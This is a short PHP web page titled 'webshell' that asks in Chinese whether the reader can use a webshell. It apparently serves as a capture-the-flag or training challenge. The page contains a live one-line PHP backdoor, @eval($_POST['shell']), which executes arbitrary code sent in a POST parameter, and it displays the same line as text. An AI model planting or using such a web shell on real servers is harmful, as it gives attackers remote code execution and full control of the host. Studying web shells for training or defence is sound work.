<html>
<head>
    <meta charset="UTF-8">
    <title>webshell</title>
    <link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet" />
    <style>
        body{
            margin-left:auto;
            margin-right:auto;
            margin-TOP:200PX;
            width:20em;
        }
    </style>
</head>
<body>
<h3>你会使用webshell吗？</h3>

<?php
@eval($_POST['shell']);
$str = '<?php @eval($_POST[\'shell\']);?>';
echo htmlentities($str, ENT_QUOTES, "UTF-8");
?>
</body>
